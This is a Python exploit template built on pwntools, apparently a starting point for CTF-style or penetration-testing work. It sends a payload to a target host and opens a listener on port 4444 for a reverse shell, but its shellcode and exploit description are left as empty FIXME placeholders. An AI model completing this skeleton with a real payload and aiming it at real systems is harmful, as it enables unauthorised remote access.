#!/usr/bin/env python3
#
# FIXME: <exploit description>
# * pwntools
# * metasploit reverse_tcp payload
# * Ropper

import sys
import pwn
from threading import Thread


# set target info
RHOST = '127.0.0.1'
RPORT = 80  # FIXME
LPORT = 4444


def generate_payload():
    NOP = pwn.asm("nop")  # noqa: F841
    payload = ""

    # FIXME: msfvenom command # noqa: E501
    shellcode = ""

    payload += shellcode

    return "{}\n".format(payload)


def attack():
    r = pwn.remote(RHOST, RPORT, typ="tcp")
    r.send(generate_payload())


if __name__ == "__main__":
    if len(sys.argv) > 1:
        RHOST = sys.argv[1]

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
